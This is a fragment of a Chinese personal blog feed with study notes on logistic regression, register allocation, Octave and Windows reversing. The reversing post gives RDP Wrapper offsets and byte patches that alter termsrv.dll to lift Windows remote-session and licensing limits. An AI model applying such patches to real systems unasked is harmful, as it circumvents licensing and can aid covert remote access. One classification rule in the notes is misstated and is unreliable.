class="hljs-keyword">end</span><br></code></pre></td></tr></table></figure><p>degree 可以控制映射到的最高次项，经过我测试用一个圆（即2次）也是可以拟合的，但是准确度肯定就不行了2333.</p><img src="/2021/02/23/Exercise-Logistic-Regression/image-20210223211144955.png" class="" title="image-20210223211144955"><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Train</span> Accuracy: <span class="hljs-number">81</span>.<span class="hljs-number">355932</span><br><span class="hljs-attribute">Expected</span> accuracy (with lambda = <span class="hljs-number">1</span>): <span class="hljs-number">83</span>.<span class="hljs-number">1</span> (approx)<br></code></pre></td></tr></table></figure><p>我也测试了 degree &gt; 6 (=12)的情况，准确度结果如下</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Train</span> Accuracy: <span class="hljs-number">83</span>.<span class="hljs-number">050847</span><br><span class="hljs-attribute">Expected</span> accuracy (with lambda = <span class="hljs-number">1</span>): <span class="hljs-number">83</span>.<span class="hljs-number">1</span> (approx)<br></code></pre></td></tr></table></figure><p>我猜，6次应该是老师选取的最好的结果。</p><p>最后，向量化计算后，代码实现的公式可读性极差，有现bug直接重写…..</p>]]></content>
    
    
    <categories>
      
      <category>ml</category>
      
    </categories>
    
    
    <tags>
      
      <tag>homework</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>RDP 配置文件编写记录</title>
    <link href="/2021/02/22/RDP-%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E7%BC%96%E5%86%99%E8%AE%B0%E5%BD%95/"/>
    <url>/2021/02/22/RDP-%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E7%BC%96%E5%86%99%E8%AE%B0%E5%BD%95/</url>
    
    <content type="html"><![CDATA[<h1 id="RDP-配置文件编写记录"><a href="#RDP-配置文件编写记录" class="headerlink" title="RDP 配置文件编写记录"></a>RDP 配置文件编写记录</h1><p>RDP Wrapper  官方配置文件只能支持到18年的Win10系统，新版本的系统需要自己编写 INI 文件，当然也可以去 RDP 的官方 github issues 里面寻找相应的配置文件。</p><p>RDP Ini 文件样本 for win10(10.0.19041.789)</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[10.0.19041.789]</span><br><span class="hljs-attr">LocalOnlyPatch.x86</span>=<span class="hljs-number">1</span><br><span class="hljs-attr">LocalOnlyOffset.x86</span>=B59D9<br><span class="hljs-attr">LocalOnlyCode.x86</span>=jmpshort<br><span class="hljs-attr">SingleUserPatch.x86</span>=<span class="hljs-number">1</span><br><span class="hljs-attr">SingleUserOffset.x86</span>=<span class="hljs-number">3</span>BC45<br><span class="hljs-attr">SingleUserCode.x86</span>=nop<br><span class="hljs-attr">DefPolicyPatch.x86</span>=<span class="hljs-number">1</span><br><span class="hljs-attr">DefPolicyOffset.x86</span>=<span class="hljs-number">3</span>E7C9<br><span class="hljs-attr">DefPolicyCode.x86</span>=CDefPolicy_Query_eax_ecx<br><span class="hljs-attr">SLInitHook.x86</span>=<span class="hljs-number">1</span><br><span class="hljs-attr">SLInitOffset.x86</span>=<span class="hljs-number">67</span>BF8<br><span class="hljs-attr">SLInitFunc.x86</span>=New_CSLQuery_Initialize<br><br><span class="hljs-attr">LocalOnlyPatch.x64</span>=<span class="hljs-number">1</span><br><span class="hljs-attr">LocalOnlyOffset.x64</span>=<span class="hljs-number">88</span>F41<br><span class="hljs-attr">LocalOnlyCode.x64</span>=jmpshort<br><span class="hljs-attr">SingleUserPatch.x64</span>=<span class="hljs-number">1</span><br><span class="hljs-attr">SingleUserOffset.x64</span>=<span class="hljs-number">0</span>CA4C<br><span class="hljs-attr">SingleUserCode.x64</span>=Zero<br><span class="hljs-attr">DefPolicyPatch.x64</span>=<span class="hljs-number">1</span><br><span class="hljs-attr">DefPolicyOffset.x64</span>=<span class="hljs-number">18</span>A15<br><span class="hljs-attr">DefPolicyCode.x64</span>=CDefPolicy_Query_eax_rcx<br><span class="hljs-attr">SLInitHook.x64</span>=<span class="hljs-number">1</span><br><span class="hljs-attr">SLInitOffset.x64</span>=<span class="hljs-number">1</span>D5BC<br><span class="hljs-attr">SLInitFunc.x64</span>=New_CSLQuery_Initialize<br><br><span class="hljs-section">[10.0.19041.789-SLInit]</span><br><span class="hljs-attr">bInitialized.x86</span>=D0954<br><span class="hljs-attr">bServerSku.x86</span>=D0958<br><span class="hljs-attr">lMaxUserSessions.x86</span>=D095C<br><span class="hljs-attr">bAppServerAllowed.x86</span>=D0964<br><span class="hljs-attr">bRemoteConnAllowed.x86</span>=D096C<br><span class="hljs-attr">bMultimonAllowed.x86</span>=D0970<br><span class="hljs-attr">ulMaxDebugSessions.x86</span>=D0974<br><span class="hljs-attr">bFUSEnabled.x86</span>=D0978<br><br><span class="hljs-attr">bInitialized.x64</span>=<span class="hljs-number">106028</span><br><span class="hljs-attr">bServerSku.x64</span>=<span class="hljs-number">10602</span>C<br><span class="hljs-attr">lMaxUserSessions.x64</span>=<span class="hljs-number">106030</span><br><span class="hljs-attr">bAppServerAllowed.x64</span>=<span class="hljs-number">106038</span><br><span class="hljs-attr">bRemoteConnAllowed.x64</span>=<span class="hljs-number">106040</span><br><span class="hljs-attr">bMultimonAllowed.x64</span>=<span class="hljs-number">106044</span><br><span class="hljs-attr">ulMaxDebugSessions.x64</span>=<span class="hljs-number">106048</span><br><span class="hljs-attr">bFUSEnabled.x64</span>=<span class="hljs-number">10604</span>C<br></code></pre></td></tr></table></figure><p>RDP 的Patch代码，我可以根据需要添加</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[PatchCodes]</span><br><span class="hljs-attr">nop</span>=<span class="hljs-number">90</span><br><span class="hljs-attr">Zero</span>=<span class="hljs-number">00</span><br><span class="hljs-attr">jmpshort</span>=EB<br><span class="hljs-attr">nopjmp</span>=<span class="hljs-number">90</span>E9<br><span class="hljs-attr">CDefPolicy_Query_edx_ecx</span>=BA000100008991200300005E90<br><span class="hljs-attr">CDefPolicy_Query_eax_rcx_jmp</span>=B80001000089813806000090EB<br><span class="hljs-attr">CDefPolicy_Query_eax_esi</span>=B80001000089862003000090<br><span class="hljs-attr">CDefPolicy_Query_eax_rdi</span>=B80001000089873806000090<br><span class="hljs-attr">CDefPolicy_Query_eax_ecx</span>=B80001000089812003000090<br><span class="hljs-attr">CDefPolicy_Query_eax_ecx_jmp</span>=B800010000898120030000EB0E<br><span class="hljs-attr">CDefPolicy_Query_eax_rcx</span>=B80001000089813806000090<br></code></pre></td></tr></table></figure><p>RDP Wrapper 对 termsrv.dll 有 3 处 Patch，1 处 hook。每个 Patch 后缀 <code>.x86</code> 和 <code>.x64</code> 指定架构。</p><h2 id="Patchs"><a href="#Patchs" class="headerlink" title="Patchs"></a>Patchs</h2><p>需要用 IDA 分析 termsrv.dll，加载的时候需要加载微软的符号表。</p><h3 id="LocalOnlyPatch"><a href="#LocalOnlyPatch" class="headerlink" title="LocalOnlyPatch"></a>LocalOnlyPatch</h3><p>函数: CEnforcementCore::GetInstanceOfTSLicense</p><p>签名:?GetInstanceOfTSLicense@CEnforcementCore@@UEAAJAEAU_GUID@@PEAPEAVITSLicense@@@Z</p><img src="/2021/02/22/RDP-%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E7%BC%96%E5%86%99%E8%AE%B0%E5%BD%95/image-20210222162509030.png" class="" title="image-20210222162509030"><p>把 jz 改成 jmp： LocalOnlyCode.x64=jmpshort</p><h3 id="SingleUserPatch"><a href="#SingleUserPatch" class="headerlink" title="SingleUserPatch"></a>SingleUserPatch</h3><p>函数: CSessionArbitrationHelperMgr::IsSingleSessionPerUserEnabled</p><p>签名: ?IsSingleSessionPerUserEnabled@CSessionArbitrationHelperMgr@@UEAAJPEAH@Z</p><img src="/2021/02/22/RDP-%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E7%BC%96%E5%86%99%E8%AE%B0%E5%BD%95/image-20210222162844238.png" class="" title="image-20210222162844238"><p>改成常量1改成0：SingleUserCode.x64=Zero 注意 offset 的位置。</p><h3 id="DefPolicyPatch"><a href="#DefPolicyPatch" class="headerlink" title="DefPolicyPatch"></a>DefPolicyPatch</h3><p>函数: CDefPolicy::Query</p><p>签名: ?Query@CDefPolicy@@UEAAJPEAH@Z</p><img src="/2021/02/22/RDP-%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E7%BC%96%E5%86%99%E8%AE%B0%E5%BD%95/image-20210222171012966.png" class="" title="image-20210222171012966"><p>改成如下</p><img src="/2021/02/22/RDP-%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E7%BC%96%E5%86%99%E8%AE%B0%E5%BD%95/image-20210222171115107.png" class="" title="image-20210222171115107"><p>DefPolicyCode.x64=CDefPolicy_Query_eax_rcx</p><p>这里的 [rcx+638h] 是最大的连接数，直接给它赋值一个大数值即可。</p><h3 id="SLInitHook"><a href="#SLInitHook" class="headerlink" title="SLInitHook"></a>SLInitHook</h3><p>hook 的目标函数是: CConnectionHandlerItem::CConnHandlerKeepAliveObject::Cleanup</p><p>签名: ?Cleanup@CConnHandlerKeepAliveObject@CConnectionHandlerItem@@AEAAXXZ</p><p>SLInitOffset.x64 填这个函数的偏移即可。</p><h3 id="其它全局变量"><a href="#其它全局变量" class="headerlink" title="其它全局变量"></a>其它全局变量</h3><p>[x.x.x.x-SLInit] 中的值</p><p> 我只给出这些全局变量的符号, IDA 加载符号表后可以直接定位</p><table><thead><tr><th>属性</th><th>符号</th></tr></thead><tbody><tr><td>bInitialized</td><td>?bInitialized@CSLQuery@@0HA</td></tr><tr><td>bServerSku</td><td>?bServerSku@CSLQuery@@0HA</td></tr><tr><td>lMaxUserSessions</td><td>?lMaxUserSessions@CSLQuery@@0JA</td></tr><tr><td>bAppServerAllowed</td><td>?bAppServerAllowed@CSLQuery@@0HA</td></tr><tr><td>bRemoteConnAllowed</td><td>?bRemoteConnAllowed@CSLQuery@@0HA</td></tr><tr><td>bMultimonAllowed</td><td>?bMultimonAllowed@CSLQuery@@0HA</td></tr><tr><td>ulMaxDebugSessions</td><td>?ulMaxDebugSessions@CSLQuery@@0KA</td></tr><tr><td>bFUSEnabled</td><td>?bFUSEnabled@CSLQuery@@0HA</td></tr></tbody></table><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://paper.seebug.org/papers/scz/windows/201804121554.txt">https://paper.seebug.org/papers/scz/windows/201804121554.txt</a></p><p><a href="https://github.com/stascorp/rdpwrap">https://github.com/stascorp/rdpwrap</a></p>]]></content>
    
    
    <categories>
      
      <category>RedTeam</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Reverse</tag>
      
      <tag>Windows</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Ml3:Classification</title>
    <link href="/2021/02/21/Ml3-Classification/"/>
    <url>/2021/02/21/Ml3-Classification/</url>
    
    <content type="html"><![CDATA[<h1 id="Classification"><a href="#Classification" class="headerlink" title="Classification"></a>Classification</h1><h2 id="模型"><a href="#模型" class="headerlink" title="模型"></a>模型</h2><p>分类问题中，预测的变量  y 为离散值，以前学习的线性回归模型就不适用了。分类将用到的算法是逻辑回归( <strong>Logistic Regression</strong> )。</p><p>我们先讨论二元的分类算法，即把输入分成两类，也就是说 y 的值为 0 或 1.</p><p>逻辑回归假设函数：$h_\theta(x)=g(\theta^Tx)$ 该函数值的范围始终是 0 到 1 之间。</p><p>当 $h_\theta(x) &gt;= 0.5$ 时，预测 y = 1</p><p>当 $h_\theta(x) &lt; 0.5$ 时，预测 y = 1</p><p>可以理解为 $h_\theta(x)$ 是计算给定输入，输出为 y=1 的可能性。</p><p>其中 g 代表的是逻辑函数，课程中选的逻辑函数叫 <code>Sigmoid function</code>, 该函数的图形是 S 形。</p><p>$g(x) = \frac{1}{1+e^{-x}}$</p><img src="/2021/02/21/Ml3-Classification/image-20210221165302648.png" class="" title="image-20210221165302648"><h2 id="决策边界"><a href="#决策边界" class="headerlink" title="决策边界"></a>决策边界</h2><p>简单说，就是假设函数所确定的图形线。这个例子中我们有：</p><p>当 $h_\theta(x) = g(\theta^Tx) &gt;= 0.5$ 时，预测 y = 1<br>当 $h_\theta(x) = g(\theta^Tx) &lt; 0.5$ 时，预测 y = 1</p><p>根据 Sigmoid 函数性质，可以继续得出:</p><p>$\theta^Tx &gt;= 0$ 时，预测 y = 1<br>$\theta^Tx &lt; 0$ 时，   预测 y = 0</p><p>在图中画出 $y = \theta^Tx$ 的图形，如图</p><img src="/2021/02/21/Ml3-Classification/image-20210221171419774.png" class="" title="image-20210221171419774"><p>红色的线就是决策边界，将样本分为两类。<strong>所谓决策边界就是能够把样本正确分类的一条边界，主要有线性决策边界(linear decision boundaries)和非线性决策边界(non-linear decision boundaries)。</strong>注意：决策边界是假设函数的属性，由参数决定，而不是由数据集的特征决定。</p><p>非线性的决策边界</p><img src="/2021/02/21/Ml3-Classification/image-20210221171637022.png" class="" title="image-20210221171637022"><h2 id="代价函数"><a href="#代价函数" class="headerlink" title="代价函数"></a>代价函数</h2><p>逻辑回归假设函数的代价函数如何来选择呢？如果将 $h_\theta(x)=g(\theta^Tx)$直接带入线性回归的代价函数的话，代价函数存在<strong>局部最优解</strong>，将得到一个非凸函数(non-convexfunction)。这种非凸函数会干扰梯度下降算法，使梯度下降算法在某个局部最优解收敛。</p><img src="/2021/02/21/Ml3-Classification/image-20210221171932745.png" class="" title="image-20210221171932745"><p>如何设计代价函数来避免这种情况呢？</p><p>重新定义代价函数 $J(\theta)=\frac{1}{m}\sum\limits_{i=1}^{m}Cost(h_\theta(x^{(i)}),y^{(i)})$，cost的定义如下</p><img src="/2021/02/21/Ml3-Classification/image-20210221172653354.png" class="" title="image-20210221172653354"><p>这个 Cost 可以进一步化简合并一下，很简单，就不写出来了。$h_\theta(x)$ 与 Cost 函数的图像如下。</p><img src="/2021/02/21/Ml3-Classification/image-20210221173009527.png" class="" title="image-20210221173009527"><p>假如训练集中某样本 y = 1，$h_\theta(x)$ 要趋于1 的时候误差才最小，反之亦然。</p><p>这样，定义代价函数后，就可以使用梯度下降算法求最优参数解。</p><img src="/2021/02/21/Ml3-Classification/image-20210221173947726.png" class="" title="image-20210221173947726">]]></content>
    
    
    <categories>
      
      <category>ml</category>
      
    </categories>
    
    
    <tags>
      
      <tag>note</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Register Allocation</title>
    <link href="/2021/02/20/Register-Allocation/"/>
    <url>/2021/02/20/Register-Allocation/</url>
    
    <content type="html"><![CDATA[<h1 id="Register-Allocation"><a href="#Register-Allocation" class="headerlink" title="Register Allocation"></a>Register Allocation</h1><p>寄存器分配问题，为变量分配寄存器。变量的数量可以是无限的，CPU 内部寄存器的数量是有限的，这就牵扯到一个问题，如何为变量分配寄存器。</p><p>目前我学习了两种方法，分别是：</p><ul><li>图染色寄存器分配算法</li><li>线性扫描寄存器分配算法</li></ul><h2 id="Liveness-Analysis"><a href="#Liveness-Analysis" class="headerlink" title="Liveness Analysis"></a>Liveness Analysis</h2><p>无论是图染色算法还是线性扫描算法，都涉及到活跃变量分析。变量在某个程序点有两种状态，<code>live</code> 或 <code>dead</code>。对于变量 x 和程序点 p，判断 x 在点 p 上的值是否会在 CFG 中的某条从点 p 出发的路径中使用。如果是，就说 x 在 p 上 <code>live</code>；否则就说x在p上是 <code>dead</code>。</p><p>活跃变量分析的目的是分析程序中每一个程序点的活跃变量。活跃变量的具体过程，我会开一篇新的 blog 来写。</p><p>如图，已经分析了每一个程序点的活跃变量</p><img src="/2021/02/20/Register-Allocation/image-20210220181511694.png" class="" title="image-20210220181511694"><p>活跃变量分析应该从底向上地分析，考虑每一条指令的 USE / DEF 变量。</p><p><strong>活跃变量分析与寄存器分配有什么关系呢?</strong></p><p>假设 T1、T2 是程序中的两个变量， 若在任何一个程序点T1 、T2 中最多只有一个变量是 <code>live</code>， 那么 T1 和 T2 可以共用一个寄存器；否则，T1 和 T2 不能共用一个寄存器。 </p><h2 id="图染色寄存器分配算法"><a href="#图染色寄存器分配算法" class="headerlink" title="图染色寄存器分配算法"></a>图染色寄存器分配算法</h2><p>将活跃变量分析的结果构成一个无向图，该图的每个顶点代表一个变量，每一条边代表变量之间的活跃关系，例如某个程序点活跃变量分析结果为：{a, f, c} 则图中 a ，f，c 用边连接起来。考虑所有程序点的活跃变量分析结果，构成一个无向图，这个图叫做推断图(interference graph)</p><img src="/2021/02/20/Register-Allocation/image-20210220183127694.png" class="" title="image-20210220183127694"><p>上图中，a 和 b 没有直接连接的边，表示 a 和 b 可以共用一个寄存器；a 和 f 有直连的边，表示 a 和 f 不能共用一个寄存器。</p><p>构造好这个图后，下一步就是对该图的顶点 “染色”。  每一个颜色对应一个寄存器。染色规则与寄存器分配规则一致，因此，下文中的染色等价于寄存器分配。</p><p>如果一个图可以刚好被 k 种颜色，称这个图为 <code>k-colorable</code></p><img src="/2021/02/20/Register-Allocation/image-20210220183928133.png" class="" title="image-20210220183928133"><p>在寄存器分配问题中，k 指的是寄存器的数量，通过活跃变量分析构造的无向图是 <code>k-colorable</code>，那么这个程序最多用 k 个寄存器。实际上，并不是所有程序满足这样的需求，超过 k 个寄存器就需要 spilling，后面再讨论。</p><p>上面程序的寄存器分配结果如下</p><img src="/2021/02/20/Register-Allocation/image-20210220184340321.png" class="" title="image-20210220184340321"><h3 id="如何染色"><a href="#如何染色" class="headerlink" title="如何染色"></a>如何染色</h3><ol><li>染色是一个 np-hard 问题，没有一个很高效的算法。（Kempe 启发式算法）</li><li>染色数量不够（就是寄存器数量不够）</li></ol><p>Kempe的启发式算法</p><p>Kempe 提出，若移除图中度小于 k 的顶点，构成的图能够被染色，则原图也可以被染色。</p><img src="/2021/02/20/Register-Allocation/image-20210220191254681.png" class="" title="image-20210220191254681"><p>启发式染色算法</p><img src="/2021/02/20/Register-Allocation/image-20210220191355930.png" class="" title="image-20210220191355930"><p>简单说，就是利用贪心思想，先处理度数较高的顶点，度数越高对图的影响程度也越大。如下图，先移出度数较低的顶点，直到所有的顶点都被移出，再以逆序对移出的顶点染色。</p><img src="/2021/02/20/Register-Allocation/image-20210220191908548.png" class="" title="image-20210220191908548"><h3 id="Spilling"><a href="#Spilling" class="headerlink" title="Spilling"></a>Spilling</h3><p>无法为所有变量分配对应的寄存器，寄存器数量不够怎么办？这种情况下，有一些变量就需要存储在内存。</p><p>例如，假设 k = 3，即寄存器数量为 3</p><img src="/2021/02/20/Register-Allocation/image-20210220193509718.png" class="" title="image-20210220193509718"><p>移出 a 顶点后仍不满足 3-coloring，移出 a 顶点后，其余的顶点度数都大于 3，所以这个图不可能只用三个颜色染色。</p><img src="/2021/02/20/Register-Allocation/image-20210220193702009.png" class="" title="移出a顶点"><p>如果推断图中的每一个顶点的度都大于 k，则该图不可能用 k 个颜色染色，这时候需要选一个顶点作为存储在内存的候选，从图中移出该顶点。这个例子中选择移出顶点 f，继续做 k 染色。</p><p>最终移出的顺序为: {c,e,d,b,f,a} (左边是栈顶)</p><p>依次为 c， e， d， b 染色</p><img src="/2021/02/20/Register-Allocation/image-20210220194547868.png" class="" title="image-20210220194547868"><p>栈中剩余 {f, a}</p><p>当给 f 染色的时候发现，已经没有足够的颜色（寄存器）分配给 f，f 只能分配到内存。读写内存又会涉及到寄存器。我们假设给 f 分配的内存地址为 fa</p><p>读取 f 之前，需要 load f, fa</p><p>修改 f 之后，需要 store f, fa</p><p>接下来修改代码</p><img src="/2021/02/20/Register-Allocation/image-20210220194843485.png" class="" title="image-20210220194843485"><img src="/2021/02/20/Register-Allocation/image-20210220194926779.png" class="" title="image-20210220194926779"><p>重新计算活跃变量</p><img src="/2021/02/20/Register-Allocation/image-20210220194957943.png" class="" title="image-20210220194957943"><p>重新构建推断图</p><img src="/2021/02/20/Register-Allocation/image-20210220195015865.png" class="" title="image-20210220195015865"><p>这张图就是 3-colorable，刚好可以分配3个寄存器。</p><h2 id="线性扫描寄存器分配算法"><a href="#线性扫描寄存器分配算法" class="headerlink" title="线性扫描寄存器分配算法"></a>线性扫描寄存器分配算法</h2><p>引入一个新的概念 Live Interval，就是一个变量的大搞作用范围。</p><p>先活跃变量分析</p><img src="/2021/02/20/Register-Allocation/image-20210220202054895.png" class="" title="image-20210220202054895"><p>计算变量的 Live Interval，下图中绿色就是变量的 Live Interval</p><img src="/2021/02/20/Register-Allocation/image-20210220202145894.png" class="" title="image-20210220202145894"><p>有重叠部分的变量不能用一个寄存器，没有重叠的变量可以用一个寄存器。</p><p>很直观，但是效率没有图染色高。</p>]]></content>
    
    
    <categories>
      
      <category>compiler</category>
      
    </categories>
    
    
    <tags>
      
      <tag>note</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Ml2:Octave Notes</title>
    <link href="/2021/02/16/ML2-Octave-Notes/"/>
    <url>/2021/02/16/ML2-Octave-Notes/</url>
    
    <content type="html"><![CDATA[<h1 id="Octave"><a href="#Octave" class="headerlink" title="Octave"></a>Octave</h1><p>记录一些 Octave 特有的语法</p><p>逻辑运算</p><ul><li>不等于： ~=</li></ul><p>注释</p><ul><li>%</li></ul><p>语句后面加分号可以避免回显。</p><p>disp(var) 输出var的值</p><p>矩阵写法: A = [1, 2; 3 , 4 ; 5, 6]</p><p>类似python 中 range 的写法:</p><p>v = 1:0.1:2</p><p>v =  1 : 6</p><h2 id="产生矩阵的方法"><a href="#产生矩阵的方法" class="headerlink" title="产生矩阵的方法"></a>产生矩阵的方法</h2><ul><li>ones(2, 3)</li><li>zeros(2, 3)</li><li>rand(2, 3)</li><li>eye(4)  单位矩阵</li><li>magic(5) 幻方矩阵</li></ul><p>计算矩阵长度： size(A) 返回的也是一个矩阵</p><p>帮助指令: help xxx</p><p>xxx 会变成变量名，代表这个文件，可以用 who/whos 命令查看所有变量。</p><p>释放内存: clear 变量名</p><p>切片：v = priceY(1:10)  把变量 priceY 的前十个元素赋值给 v</p><h2 id="文件加载与存储"><a href="#文件加载与存储" class="headerlink" title="文件加载与存储"></a>文件加载与存储</h2><ul><li>save hello.mat v; 把 v 保存到 hello.dat 文件（二进制形式）</li><li>save hello.mat v -ascii; 把 v 保存到 hello.dat 文件（ASCII形式）</li><li>加载文件： load xxx.dat   或者 load(‘xxx.data’)</li></ul><h2 id="切片-拼接"><a href="#切片-拼接" class="headerlink" title="切片/拼接"></a>切片/拼接</h2><p>A =  [1, 2; 3 , 4 ; 5, 6]</p><p>A(3, 2)  A 中第3行，第2列的元素</p><p>A(3, :)  第3行所有元素，: 代表所有元素</p><p>A(:, 2)  第2列所有元素，: 代表所有元素</p><p>A(:, 2) = [10; 11; 12] 给第2列赋值</p><p>A = [A,[100; 200; 300]]; 添加一列</p><p>A(:) 将A的所有元素创建成列向量</p><p>C = [A  B] 将 A B 左右拼接起来</p><p>C = [A ; B] 把 AB 上下拼接</p><h2 id="运算"><a href="#运算" class="headerlink" title="运算"></a>运算</h2><ul><li><p>A * B</p></li><li><p>A .* B 点乘，AB中相同位置元素相乘</p></li><li><p>A.^ 2 每个元素做作square运算</p></li><li><p>1 ./ V  求对应元素的倒数 （V ^ -1）</p></li><li><p>log(v) 对每个元素</p></li><li><p>exp(v) </p></li><li><p>abs(v)</p></li><li><p>A’  A的转置</p></li><li><p>max(A) 求每一列的最大值， max（max（A）） 取A中最大值</p></li><li><p>A &lt; 3 返回的是一个矩阵…..对应01表示对应元素与关系符运算结果</p></li><li><p>[r, c] = find（A &lt; 3） 返回 A 中满足条件的元素下标</p></li><li><p>sum（A） </p></li><li><p>sum(A, 1) 求每一列的总和</p></li><li><p>sum(A, 2) 求每一行的总和 </p></li><li><p>pinv(A) 求A的逆矩阵</p></li><li><p>prod(A) 返回 A 中所有元素的乘积</p></li><li><p>floor / ceil 取整的</p></li><li><p>max(A, [], 1) 返回每一列的最大值矩阵</p></li><li><p>max(A, [], 2) 返回每一行的最大值矩阵</p></li></ul><h2 id="plot-画图"><a href="#plot-画图" class="headerlink" title="plot 画图"></a>plot 画图</h2><p>绘制 sin</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs octave">t &#x3D; [0:0.01:0.98];<br>y1 &#x3D; sin(2*pi*4*t);<br>plot(t, y1);<br></code></pre></td></tr></table></figure><p>保留画板: hold on;</p><p>指定标签:</p><pre><code>- xlabel(&#39;x-ray&#39;)- ylabel(&#39;y-ray&#39;)- legend(&#39;sin&#39;, &#39;cos&#39;)   指定不同曲线的名称- title(&#39;xxxx&#39;)</code></pre><p>保存成图片: print -dpng ‘xxxx.png’</p><p>figure(n) 绘制图n</p><p>subplot(1,2,1) 表格布局（1 x 2），最后一个参数表示接下来操作的布局</p><p> axis 修改坐标轴区间</p><p>clf 清除图像 </p><h2 id="控制语句"><a href="#控制语句" class="headerlink" title="控制语句"></a>控制语句</h2><p>for 循环</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs octave">for i&#x3D;1:10,<br>v(i) &#x3D; 2 ^ i<br>end;<br></code></pre></td></tr></table></figure><p>While  循环</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs octave">while i &lt;&#x3D; 5,<br>v(i) &#x3D; 100;<br>i &#x3D; i + 1;<br>end;<br></code></pre></td></tr></table></figure><p>if/while 嵌套</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs octave">while true,<br>v(i) &#x3D; 99;<br>i &#x3D; i + 1;<br>if i &#x3D;&#x3D; 6,<br>break;<br>end;<br>end;<br></code></pre></td></tr></table></figure><p>If/else</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs octave">if v(1) &#x3D;&#x3D; 1,<br>disp(&#39;The Value is 1&#39;);<br>elseif v(1) &#x3D;&#x3D; 2,<br>disp(&#39;The Value is 2&#39;);<br>else,<br>disp(&#39;The value is not 1 or 2&#39;);<br>end;<br></code></pre></td></tr></table></figure><h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><p>定义函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs octave">function y &#x3D; myfunc(x)<br>y &#x3D; x ^ 2;<br>end;<br><br></code></pre></td></tr></table></figure><p>调用函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs octave">myfunc(5)<br></code></pre></td></tr></table></figure><p>函数可以返回多个值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs octave">function [y1, y2] &#x3D; myfunc()<br>y1 &#x3D; 1;<br>y2 &#x3D; 2;<br>end;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ml</category>
      
    </categories>
    
    
    <tags>
      
      <tag>note</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SSA Form</title>
    <link href="/2021/02/10/SSA-Form/"/>
    <url>/2021/02/10/SSA-Form/</url>
    
